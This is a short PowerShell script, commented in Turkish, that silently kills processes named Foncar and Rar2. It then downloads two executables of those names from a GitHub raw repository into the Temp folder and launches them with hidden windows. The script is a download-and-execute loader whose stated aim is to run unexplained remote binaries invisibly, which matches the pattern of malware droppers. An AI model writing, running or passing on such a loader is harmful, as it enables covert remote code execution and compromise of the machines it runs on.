# Calisan eski islemleri sessizce durdur
Stop-Process -Name "Foncar" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "Rar2" -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

# Dosyalarin tutulacagi gecici (Temp) yollar
$tempFoncar = "$env:TEMP\Foncar.exe"
$tempRar2 = "$env:TEMP\Rar2.exe"

# GitHub raw linkleri
$urlFoncar = "https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/Foncar.exe"
$urlRar2 = "https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/Rar2.exe"

# En guncel exe'leri gecici dizine indir (eskilerin uzerine yazar)
Invoke-WebRequest -Uri $urlFoncar -OutFile $tempFoncar -UseBasicParsing
Invoke-WebRequest -Uri $urlRar2 -OutFile $tempRar2 -UseBasicParsing

# Dosyalari arka planda tamamen gizli olarak calistir
Start-Process -FilePath $tempFoncar -WindowStyle Hidden
Start-Process -FilePath $tempRar2 -WindowStyle Hidden